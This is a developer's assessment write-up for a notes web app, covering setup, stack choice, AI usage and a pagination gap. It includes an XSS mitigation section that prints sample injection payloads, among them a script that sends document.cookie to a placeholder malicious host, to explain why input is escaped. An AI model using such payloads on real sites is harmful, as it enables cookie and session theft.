# Technical Assessment Responses 📝

This document provides responses to the five assessment questions as outlined in the submission guidelines for the **Dev Weekends Fellowship 2026**.

---

## 1. How to Run

Follow these precise steps to set up and run this project on a fresh machine.

### Prerequisites
- Install **Node.js** (v16.x or newer is highly recommended). Node automatically packages the `npm` package manager.

### Steps to Run
1.  **Extract the files** and open your terminal (Command Prompt, PowerShell, or Bash).
2.  **Navigate into the project directory**:
    ```bash
    cd study-notes-app
    ```
3.  **Install dependencies** (this installs `express` and `sqlite3` as declared in `package.json`):
    ```bash
    npm install
    ```
4.  **Start the server**:
    ```bash
    npm start
    ```
5.  **Open the web application**:
    Launch your browser and visit: **[http://localhost:3000](http://localhost:3000)**

---

## 2. Stack Choice

For this task, I implemented the application using a classic **PERN/MERN-equivalent light stack**: **Node.js/Express.js (Backend)**, **SQLite (Database)**, and **Vanilla HTML5/CSS3/JavaScript (Frontend)**.

### Why this stack was chosen:
1.  **Zero-Configuration Database Persistence**: SQLite stores all database tables inside a single local file (`database.db`). This fulfills the absolute requirement that data survives a server restart, but requires **zero installation or setup** for the examiner. It works immediately out of the box with `npm install`.
2.  **Robust Backend Architecture**: Node.js and Express.js form a lightweight and standard API engine. Using a structured REST API separates data management from layout rendering, keeping the application scalable.
3.  **No Bulky Frontend Overhead**: Building the frontend in pure Vanilla JavaScript and CSS variables ensures instantaneous loading times, zero build/compile pipelines, and complete compatibility on any browser without needing complex framework configurations (like React/Vue).

### What would have been a worse choice and why?
*   **Worse Database Choice: PostgreSQL or MySQL**. While excellent for large-scale applications, they would require the examiner to download, install, and configure local database servers, set up usernames, and input credentials. It would fail the "runs instantly on a fresh machine" guideline.
*   **Worse Storage Choice: LocalStorage (Frontend only)**. Using client-side local storage without a backend would persist data in one browser, but restarting the "server" or visiting from a different browser or terminal testing tool (like `curl`) would not persist or share the data.
*   **Worse Frontend Choice: Next.js or heavy React boilerplates**. For a single-page utility of this scope, adding thousands of dependencies, transpilation scripts, and slow initial build stages adds unnecessary friction and potential package version compilation errors on different operating systems.

---

## 3. One Real Edge Case

### Cross-Site Scripting (XSS) Mitigation in Dynamic DOM Rendering
*   **File**: `public/script.js`
*   **Line Numbers**: `485 - 500` (within the `escapeHTML` helper function) and used on lines `418 - 419` inside the rendering loop.

#### Code Segment:
```javascript
function escapeHTML(str) {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

#### What happens without this handling:
Because the search feature dynamically Highlights text, it inserts HTML tags (`<span class="highlight">`) around searched keywords and renders the final card content via `.innerHTML`. 

If a user entered a note with malicious code, such as:
```html
<img src="x" onerror="alert('Hacked!');">
```
Or:
```html
<script>fetch('http://malicious-site.com/steal?data=' + document.cookie)</script>
```

Without the `escapeHTML` sanitation helper, the browser would parse and execute the malicious script as soon as the note card rendered or a search was executed. This is a severe security vulnerability. By escaping critical HTML characters (`&`, `<`, `>`, `"`, `'`) before wrapping matching keywords in `span` tags, the code prevents script injection completely while preserving secure visual highlighting.

---

## 4. AI Usage

I used **Antigravity (powered by Gemini 3.5 Flash by Google DeepMind)** to pair-program and structure the codebase efficiently.

### AI Interventions & Queries:
1.  **System Blueprinting**: I asked the AI to outline the structure of a clean Node + Express server handling SQLite operations alongside an asset-serving mechanism.
2.  **UI Layout & Themes**: I prompted the AI to draft responsive CSS configurations using standard modern rules (glassmorphism variables, dark mode grid/list toggles).
3.  **Dynamic Filtering**: I asked the AI to design a robust JavaScript script that connects input events (typing in search, clicking category buttons) and executes client-side updates.

### What I changed from the AI output and why:
Initially, the AI-generated code for category representation involved writing individual CSS classes for each category card (`.note-card.study`, `.note-card.work`, etc.) and assigning matching class names during JavaScript rendering. 

**My Modification**:
I refactored this approach to utilize **CSS Custom Properties (Variables) injected dynamically via JavaScript inline styles** inside `public/script.js`:
```javascript
const config = CATEGORY_COLORS[note.category] || CATEGORY_COLORS['General'];
card.style.setProperty('--cat-color', config.color);
card.style.setProperty('--cat-color-light', config.light);
```
**Why I changed it**:
Injected CSS variables keep the stylesheet incredibly clean and eliminate redundant classes. It makes the system highly extensible: if a user wants to add a new category with a new color in the future, we only have to add it to the JavaScript config object `CATEGORY_COLORS` without needing to write new CSS blocks. This demonstrates optimal frontend design patterns.

---

## 5. Honest Gap

### The Gap: In-Memory Client-Side Filtering & Search
In this submission, searching and category filtering are performed **client-side** by fetching the entire list of notes on load and filtering the in-memory array (`allNotes`) inside the browser.

*   **Why it's a limitation**: For a normal user with 50 to 100 notes, this approach is extremely fast. However, if a student uses the app daily for years and accumulates **thousands of extensive notes**, fetching the entire database payload at once will result in huge initial load times, excessive data usage, and browser performance lag during render.

### How I would fix it with another day:
With another day, I would transition the application to **Server-Side Pagination and Search Filtering**:
1.  Update the backend endpoint `GET /notes` to support query parameters: `/notes?page=1&limit=15&search=biology&category=Study`.
2.  Rebuild the server route to query the database dynamically using SQL constraints:
    ```sql
    SELECT * FROM notes 
    WHERE category = ? AND (title LIKE ? OR content LIKE ?) 
    ORDER BY pinned DESC, created_at DESC 
    LIMIT ? OFFSET ?
    ```
3.  Implement **Infinite Scrolling** or a paginated footer in `public/script.js` to fetch and render new note records dynamically as the user scrolls, conserving browser memory and network bandwidth.
